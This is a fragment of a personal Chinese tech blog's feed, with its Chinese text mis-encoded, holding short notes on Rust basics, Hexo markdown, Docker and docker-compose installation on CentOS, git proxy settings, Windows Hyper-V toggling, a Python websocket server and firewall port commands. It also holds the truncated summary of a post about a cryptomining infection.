    <summary type="html">&lt;h1 id=&quot;é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&quot;&gt;&lt;a href=&quot;#é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&quot;&gt;&lt;/a&gt;é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&lt;/h1&gt;&lt;p&gt;èµ·å› æ˜¯é˜Ÿé‡Œè€å¸ˆçš„æœåŠ¡å™¨ä¸­æ‹›äº†ï¼Œä¸è¿‡æ˜¯åœ¨doc</summary>
      
    
    
    
    
    <category term="åŒºå—é“¾å®‰å…¨" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>test-my-new-blog</title>
    <link href="https://x1a0.net/2021/11/05/test-my-new-blog/"/>
    <id>https://x1a0.net/2021/11/05/test-my-new-blog/</id>
    <published>2021-11-05T06:50:13.000Z</published>
    <updated>2021-11-05T07:23:34.151Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜"><a href="#æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜" class="headerlink" title="æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜"></a>æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜</h3><h4 id="æˆ‘æ˜¯å››çº§æ ‡é¢˜"><a href="#æˆ‘æ˜¯å››çº§æ ‡é¢˜" class="headerlink" title="æˆ‘æ˜¯å››çº§æ ‡é¢˜"></a>æˆ‘æ˜¯å››çº§æ ‡é¢˜</h4><h5 id="æˆ‘æ˜¯äº”çº§æ ‡é¢˜"><a href="#æˆ‘æ˜¯äº”çº§æ ‡é¢˜" class="headerlink" title="æˆ‘æ˜¯äº”çº§æ ‡é¢˜"></a>æˆ‘æ˜¯äº”çº§æ ‡é¢˜</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜</span><br><span class="line">#### æˆ‘æ˜¯å››çº§æ ‡é¢˜</span><br><span class="line">##### æˆ‘æ˜¯äº”çº§æ ‡é¢˜</span><br></pre></td></tr></table></figure><hr><p><em><strong>æˆ‘æ˜¯ç²—æ–œä½“</strong></em> </p><p><em>æˆ‘æ˜¯æ–œä½“</em></p><p><strong>æˆ‘æ˜¯ç²—ä½“</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***æˆ‘æ˜¯ç²—æ–œä½“*** </span><br><span class="line"></span><br><span class="line">*æˆ‘æ˜¯æ–œä½“*</span><br><span class="line"></span><br><span class="line">**æˆ‘æ˜¯ç²—ä½“**</span><br></pre></td></tr></table></figure><hr><p><del>æˆ‘æ˜¯åˆ é™¤çº¿</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~æˆ‘æ˜¯åˆ é™¤çº¿~~</span><br></pre></td></tr></table></figure><hr><p><u>æˆ‘æ˜¯ä¸‹åˆ’çº¿</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;u&gt;æˆ‘æ˜¯ä¸‹åˆ’çº¿&lt;/u&gt;</span><br></pre></td></tr></table></figure><hr><ol><li>åˆ—è¡¨<ul><li>å°åˆ—è¡¨</li></ul></li><li>åˆ—è¡¨<ul><li>å¤§åˆ—è¡¨</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. åˆ—è¡¨</span><br><span class="line">    - å°åˆ—è¡¨</span><br><span class="line">2. åˆ—è¡¨</span><br><span class="line">    - å¤§åˆ—è¡¨</span><br></pre></td></tr></table></figure><hr><blockquote><p>åŒºå—</p><blockquote><p>ç¬¬äºŒå±‚åŒºå—</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; åŒºå—</span><br><span class="line">&gt;&gt; ç¬¬äºŒå±‚åŒºå—</span><br></pre></td></tr></table></figure><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget x1a0.net</span><br></pre></td></tr></table></figure><hr><p>è¿™æ˜¯<a href="x1a0.net">é“¾æ¥</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯[é“¾æ¥](x1a0.net)</span><br></pre></td></tr></table></figure><hr><p><img src="../../../../img/zhi.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](../../../../img/zhi.jpg)</span><br></pre></td></tr></table></figure><hr><table><thead><tr><th align="left">å·¦å¯¹é½</th><th align="right">å³å¯¹é½</th><th align="center">å±…ä¸­å¯¹é½</th></tr></thead><tbody><tr><td align="left">å•å…ƒæ ¼</td><td align="right">å•å…ƒæ ¼</td><td align="center">å•å…ƒæ ¼</td></tr><tr><td align="left">å•å…ƒæ ¼</td><td align="right">å•å…ƒæ ¼</td><td align="center">å•å…ƒæ ¼</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| å·¦å¯¹é½ | å³å¯¹é½ | å±…ä¸­å¯¹é½ |</span><br><span class="line">| :-----| ----: | :----: |</span><br><span class="line">| å•å…ƒæ ¼ | å•å…ƒæ ¼ | å•å…ƒæ ¼ |</span><br><span class="line">| å•å…ƒæ ¼ | å•å…ƒæ ¼ | å•å…ƒæ ¼ |</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&quot;&gt;&lt;a href=&quot;#æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&quot; class=&quot;headerlink&quot; title=&quot;æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&quot;&gt;&lt;/a&gt;æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&lt;/h3&gt;&lt;h4 id=&quot;æˆ‘æ˜¯å››çº§æ ‡é¢˜&quot;&gt;&lt;a href=&quot;#æˆ‘æ˜¯å››çº§æ ‡é¢˜&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Hexo" scheme="https://x1a0.net/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>rustå­¦ä¹ ç¬¬äºŒå¤©</title>
    <link href="https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2021-07-27T10:08:30.000Z</published>
    <updated>2021-07-27T11:21:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ‡ç‰‡</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œè¾“å‡ºç¬¬ä¸€ä¸ªå•è¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">first_word</span> </span>(_<span class="built_in">str</span>:&amp;<span class="built_in">str</span>) -&gt; &amp;<span class="built_in">str</span> &#123; <span class="comment">//éœ€è¦ä¼ å…¥å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œä¼ å‡ºä¹Ÿæ˜¯å­—ç¬¦ä¸²åˆ‡ç‰‡ã€‚</span></span><br><span class="line">    <span class="keyword">let</span> byte_str = _<span class="built_in">str</span>.as_bytes();<span class="comment">//å­—ç¬¦ä¸²åˆ‡ç‰‡ç±»å‹æ²¡æ³•ç›´æ¥è¿­ä»£ï¼Œé€šè¿‡as_bytesè½¬æ¢æˆå­—èŠ‚æ•°ç»„ã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (num,&amp;value) <span class="keyword">in</span> byte_str.iter().enumerate()&#123; <span class="comment">//é€šè¿‡å­—èŠ‚æ•°ç»„.iter().enumerate()è§£è€¦ï¼Œè¿”å›ï¼ˆä¸‹æ ‡ï¼Œå€¼ï¼‰ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> value == <span class="string">b&#x27; &#x27;</span> &#123; <span class="comment">//åªèƒ½ç”¨b&#x27; &#x27;è¿™ä¸ªè¡¨ç¤ºç©ºæ ¼ï¼Œä¸çŸ¥é“ç›´æ¥ &#x27; &#x27;ï¼Œ&quot; &quot;ä¸ºå•¥ä¸è¡Œã€‚</span></span><br><span class="line">            <span class="keyword">return</span> &amp;_<span class="built_in">str</span>[..num];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;_<span class="built_in">str</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> _string_type_1 = <span class="string">&quot;hello xiaoyue&quot;</span>;<span class="comment">//æœ¬æ¥å°±æ˜¯å­—ç¬¦ä¸²å¼•ç”¨ç±»å‹ï¼Œ[å£°æ˜å‡ºæ¥ä¸å¯å˜äº†ï¼Œæ ˆä¸­çš„]</span></span><br><span class="line">    <span class="keyword">let</span> _string_type_2 = <span class="built_in">String</span>::from(<span class="string">&quot;hello xiaoyue&quot;</span>);<span class="comment">//è¿™ä¸ªæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥ä¼ å‚çš„æ—¶å€™è¦åŠ &amp;å¼•ç”¨ç¬¦å·ï¼Œ[ä¸“é—¨å£°æ˜çš„å †ä¸­çš„]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> s = first_word(&amp;_string_type_2);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åˆ‡ç‰‡&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
    
    
    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>rustå­¦ä¹ ç¬¬ä¸€å¤©</title>
    <link href="https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2021-07-26T07:19:25.000Z</published>
    <updated>2021-07-27T11:21:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>åŒ…å¼•å…¥ï¼Œå–éšæœºæ•°ï¼Œæšä¸¾ç±»ä½¿ç”¨</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::stdin; <span class="comment">//å¼•å…¥stdinåŒ…ï¼Œé€šè¿‡sdtinä¸‹çš„read_lineå‡½æ•°è·å–å‘½ä»¤è¡Œè¿”å›å€¼</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng; <span class="comment">//å¼•å…¥Rngè¿™ä¸ªæ¥å£ï¼Œé€šè¿‡rand::thread_rng().gen_range()è·å–éšæœºæ•°</span></span><br><span class="line"><span class="keyword">use</span> std::cmp::Ordering;<span class="comment">//å¼•å…¥æšä¸¾åŒ…ï¼Œé€šè¿‡ordering::xxæ¥æ§åˆ¶è¿”å›ï¼Œé€šè¿‡matchæŠ“å–ä¸åŒçš„ordering</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sec = rand::thread_rng().gen_range(<span class="number">1</span>..<span class="number">101</span>);      </span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;è¿™ä¸ªç§˜å¯†çš„æ•°æ˜¯ï¼š&#123;&#125;\n&quot;</span>,sec);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> string1 = <span class="built_in">String</span>::new();<span class="comment">//å£°æ˜ä¸€ä¸ªstringç±»å‹çš„å¯å˜å˜é‡string::new()</span></span><br><span class="line">        stdin().read_line(&amp;<span class="keyword">mut</span> string1).expect(<span class="string">&quot;ä¸èƒ½è¯»å–ï¼\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">let</span> string1:<span class="built_in">i32</span> = <span class="keyword">match</span> string1.trim().parse() &#123; <span class="comment">//å˜é‡çš„è¦†ç›–ï¼Œé€šè¿‡let var_name:type = xxé‡æ–°è¦†ç›–å˜é‡ï¼Œå¿…é¡»å£°æ˜ç±»å‹ã€‚trimå»é¦–å°¾ç©ºï¼Œparseè½¬æ•°å­—ï¼ŒmatchæŠ“å–è¿”å›æˆåŠŸå’Œerrå€¼å¹¶æ‰“å°ã€‚</span></span><br><span class="line">            <span class="literal">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="literal">Err</span>(err) =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125;\n&quot;</span>,err);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> sec.cmp(&amp;string1) &#123; <span class="comment">//è¿™ä¸ªæ˜¯å°†string1å’Œsecè¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">print!</span>(<span class="string">&quot;small\n&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;win!!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">print!</span>(<span class="string">&quot;big\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åŒ…å¼•å…¥ï¼Œå–éšæœºæ•°ï¼Œæšä¸¾ç±»ä½¿ç”¨&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;</summary>
      
    
    
    
    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
    
    
    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>win11é»˜è®¤å¼€å¯hyper-vè§£å†³æ–¹æ¡ˆ</title>
    <link href="https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2021-07-15T18:42:22.000Z</published>
    <updated>2021-07-15T18:45:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¿«æ·é”®win+x,ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Windows Powershell<br>å…³é—­ï¼šbcdedit /set hypervisorlaunchtype off<br>å¼€å¯: bcdedit /set hypervisorlaunchtype auto</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¿«æ·é”®win+x,ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Windows Powershell&lt;br&gt;å…³é—­ï¼šbcdedit /set hypervisorlaunchtype off&lt;br&gt;å¼€å¯: bcdedit /set hypervisorlaunchtype auto&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://x1a0.net/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>centos7å®‰è£…dockerå’Œcompose</title>
    <link href="https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/"/>
    <id>https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/</id>
    <published>2021-05-04T02:46:45.000Z</published>
    <updated>2021-05-04T03:29:48.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install docker #å®‰è£…</span><br><span class="line"></span><br><span class="line">service docker start #å¯åŠ¨</span><br><span class="line">chkconfig docker on  #è®¾ç½®å¯åŠ¨é¡¹</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composeÂ </span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
    
    <category term="Docker" scheme="https://x1a0.net/categories/Docker/"/>
    
    
    <category term="Linux" scheme="https://x1a0.net/tags/Linux/"/>
    
    <category term="Docker" scheme="https://x1a0.net/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Gitè®¾ç½®ã€å–æ¶ˆä»£ç†</title>
    <link href="https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/"/>
    <id>https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/</id>
    <published>2021-05-04T02:22:28.000Z</published>
    <updated>2021-05-04T03:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è®¾ç½®ä»£ç†</span></span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å–æ¶ˆä»£ç†</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“å¼€c:\Users\å½“å‰ç”¨æˆ·é‡Œçš„.gitconfigæ–‡ä»¶(è¿™ä¸ªé»˜è®¤æ˜¯éšè—æ–‡ä»¶),</span></span><br><span class="line"><span class="comment">#å°†é‡Œé¢å…³äºproxyçš„è¡Œåˆ æ‰</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="Git" scheme="https://x1a0.net/categories/Git/"/>
    
    
    <category term="Git" scheme="https://x1a0.net/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Peer reports incompatible or unsupported protocol version.</title>
    <link href="https://x1a0.net/2021/04/28/Peer%20reports%20incompatible%20or%20unsupported%20protocol%20version/"/>
    <id>https://x1a0.net/2021/04/28/Peer%20reports%20incompatible%20or%20unsupported%20protocol%20version/</id>
    <published>2021-04-28T06:37:57.000Z</published>
    <updated>2021-05-04T02:58:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y nss curl libcurl </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è§£å†³æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;p</summary>
      
    
    
    
    <category term="Git" scheme="https://x1a0.net/categories/Git/"/>
    
    
    <category term="Git" scheme="https://x1a0.net/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>vscodeé…ç½®åœ¨é€‰é¡¹å¡ä¸­æ‰“å¼€æ–°çª—å£</title>
    <link href="https://x1a0.net/2021/04/26/vscode%E9%85%8D%E7%BD%AE%E5%9C%A8%E9%80%89%E9%A1%B9%E5%8D%A1%E4%B8%AD%E6%89%93%E5%BC%80%E6%96%B0%E7%AA%97%E5%8F%A3/"/>
    <id>https://x1a0.net/2021/04/26/vscode%E9%85%8D%E7%BD%AE%E5%9C%A8%E9%80%89%E9%A1%B9%E5%8D%A1%E4%B8%AD%E6%89%93%E5%BC%80%E6%96%B0%E7%AA%97%E5%8F%A3/</id>
    <published>2021-04-26T15:04:20.000Z</published>
    <updated>2021-07-15T18:43:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>workbench.editor.enablePreview</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;workbench.editor.enablePreview&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Vscode" scheme="https://x1a0.net/tags/Vscode/"/>
    
  </entry>
  
  <entry>
    <title>Python websocket éƒ¨ç½²å°è®°</title>
    <link href="https://x1a0.net/2021/02/08/197/"/>
    <id>https://x1a0.net/2021/02/08/197/</id>
    <published>2021-02-07T19:25:00.000Z</published>
    <updated>2021-02-07T19:26:02.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WS server that sends messages at random intervals</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">time</span>(<span class="params">websocket, path</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        now = datetime.datetime.utcnow().isoformat() + <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">        <span class="keyword">await</span> websocket.send(now)</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(random.random() * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">start_server = websockets.serve(time, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(start_server)</span><br><span class="line">asyncio.get_event_loop().run_forever()</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è·‘ä¸åˆ°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TimeoutError: [Errno 10060] Connect call failed (&#x27;xx&#x27;, 8765)</span><br></pre></td></tr></table></figure><p>ç«¯å£ç›‘å¬æˆåŠŸçš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnpt</span><br></pre></td></tr></table></figure><p>centos7 æ£€æŸ¥é˜²ç«å¢™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --state</span><br></pre></td></tr></table></figure><p>å¼€å¯çŠ¶æ€ï¼Œæ£€æŸ¥ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --list-ports</span><br></pre></td></tr></table></figure><p>æœªå¼€æ”¾ï¼Œå¼€å¯ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=5672/tcp --permanent   # å¼€æ”¾5672ç«¯å£</span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --remove-port=5672/tcp --permanent  # å…³é—­5672ç«¯å£</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload   # é…ç½®ç«‹å³ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>åˆ¶ä½œrequirements.txt</title>
    <link href="https://x1a0.net/2020/12/18/196/"/>
    <id>https://x1a0.net/2020/12/18/196/</id>
    <published>2020-12-18T00:52:01.000Z</published>
    <updated>2020-12-18T00:52:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>pipreqs ./ â€“encoding=utf8</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;pipreqs ./ â€“encoding=utf8&lt;/p&gt;
</summary>
      
